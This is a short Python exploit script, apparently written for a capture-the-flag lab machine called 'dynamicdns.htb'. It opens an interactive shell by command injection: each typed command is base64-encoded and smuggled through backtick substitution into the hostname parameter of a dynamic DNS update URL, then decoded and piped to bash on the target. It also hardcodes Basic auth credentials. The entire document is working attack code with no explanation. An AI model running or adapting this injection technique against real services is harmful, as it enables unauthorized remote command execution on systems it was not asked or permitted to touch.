#!/usr/bin/env python3

from urllib import request 
import base64

proxy = {"http":"http://localhost:8080"}
url = "http://10.10.10.244/nic/update?myip=77.77.77.77&hostname="

headers = {"Authorization":"Basic ZHluYWRuczpzbmRhbnlk"}

while True:
    usr = input("CMD:> ")
    enc = base64.b64encode(usr.encode('ascii')).decode()
    cmd = f"`echo+-n+{enc}|base64+-d|bash`.dynamicdns.htb"
    req = request.Request(url + cmd, headers=headers)
    req.set_proxy("localhost:8080", "http")
    resp = request.urlopen(req).read().decode('utf-8')
    print(resp)


